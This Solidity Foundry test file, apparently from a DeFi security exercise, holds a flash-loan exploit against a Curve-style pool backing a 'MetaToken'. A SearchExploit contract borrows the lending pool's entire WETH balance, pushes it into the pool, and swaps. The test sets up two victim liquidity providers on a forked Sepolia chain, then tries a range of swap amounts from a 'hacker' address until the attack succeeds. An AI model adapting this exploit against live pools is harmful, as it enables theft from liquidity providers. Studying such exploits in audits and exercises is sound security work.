// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/MetaToken/CurvePool.sol";
import "../src/MetaToken/CurveToken.sol";
import "../src/MetaToken/interfaces/ILendingPool.sol";
import "../src/MetaToken/MetaPoolToken.sol";
import "../src/MetaToken/interfaces/IERC3156.sol";
import "forge-std/console.sol";

contract SearchExploit is IERC3156FlashBorrower {
    address private immutable attacker;
    address private immutable wethLendingPool;
    address private immutable weth;
    CurvePool private immutable curvePool;
    uint256 private immutable swapAmount;

    constructor(
        address _attacker,
        address _wethLendingPool,
        address _weth,
        CurvePool _curvePool,
        uint256 _swapAmount
    ) {
        attacker = _attacker;
        wethLendingPool = _wethLendingPool;
        weth = _weth;
        curvePool = _curvePool;
        swapAmount = _swapAmount;
    }

    function setupAttack() public {
        bool success = ILendingPool(wethLendingPool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            weth,
            IWETH(weth).balanceOf(address(wethLendingPool)),
            abi.encode("")
        );
        require(success, "FlashLoan not initated!");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata /*data*/
    ) external returns (bytes32) {
        require(initiator == address(this), "Not an initiator");
        require(token == weth, "Not the same Weth address");
        require(amount > 0, "Amount is Zero");

        IWETH(weth).transfer(
            address(curvePool),
            1000 * IWETH(weth).balanceOf(address(curvePool))
        );

        uint256 altTokenReceived = curvePool.exchange{value: swapAmount}(
            0,
            1,
            swapAmount,
            0
        );
        console.log("swap okay", altTokenReceived);

        uint256 FeeAmount = ILendingPool(wethLendingPool).flashFee(
            weth,
            1000 * IWETH(weth).balanceOf(address(curvePool))
        );
        require(
            IWETH(weth).approve(wethLendingPool, amount + FeeAmount),
            "Not transfered"
        );
        return IERC3156FlashBorrower.onFlashLoan.selector;
    }

    receive() external payable {}
}

contract MetaTokenSearch is Test {
    ILendingPool public wethLendingPool;
    CurvePool public swapPoolEthWeth;
    CurveToken public lpToken;
    IWETH public weth;
    MetaPoolToken public metaToken;
    address hacker;
    address alice;
    address bob;

    function setUp() public {
        vm.createSelectFork("https://sepolia.gateway.tenderly.co");

        weth = IWETH(payable(0x1194A239875cD36C9B960FF2d3d8d0f800435290));
        wethLendingPool = ILendingPool(
            0x66Df966E887e73b2f46456e062213B0C0fB42037
        );
        lpToken = new CurveToken();
        swapPoolEthWeth = new CurvePool(
            msg.sender,
            [0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, address(weth)],
            address(lpToken),
            5,
            4000000,
            5000000000
        );
        lpToken.initialize(address(swapPoolEthWeth));
        metaToken = new MetaPoolToken(lpToken, swapPoolEthWeth);

        hacker = makeAddr("hacker");
        alice = makeAddr("alice");
        bob = makeAddr("bob");

        uint[2] memory amounts;
        amounts[0] = 10 ether;
        amounts[1] = 10 ether;

        deal(alice, 20 ether);
        vm.startPrank(alice);
        weth.deposit{value: 10 ether}();
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        swapPoolEthWeth.add_liquidity{value: 10 ether}(amounts, 0);
        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(alice));
        vm.stopPrank();

        amounts[0] = 20 ether;
        amounts[1] = 20 ether;

        deal(bob, 40 ether);
        vm.startPrank(bob);
        weth.deposit{value: 20 ether}();
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        swapPoolEthWeth.add_liquidity{value: 20 ether}(amounts, 0);
        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(bob));
        vm.stopPrank();

        deal(address(this), type(uint256).max - 70 ether);
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(wethLendingPool), weth.balanceOf(address(this)));

        deal(hacker, 10 ether);
    }

    function test_find_happy_swap() public {
        vm.startPrank(hacker, hacker);
        uint start = 1 wei;
        for (uint i = 1; i <= 12; i++) {
            uint amount = start * (10 ** (i - 1));
            if (amount > 1 ether) break;
            SearchExploit ex = new SearchExploit(
                hacker,
                address(wethLendingPool),
                address(weth),
                swapPoolEthWeth,
                amount
            );
            (bool ok, ) = address(ex).call{value: hacker.balance}("");
            require(ok, "funding failed");
            try ex.setupAttack() {
                console.log("SUCCESS at swap amount", amount);
                return;
            } catch Error(string memory reason) {
                console.log("fail", amount, reason);
            } catch (bytes memory) {
                console.log("panic", amount);
            }
        }
        vm.stopPrank();
        fail("no successful swap amount");
    }
}
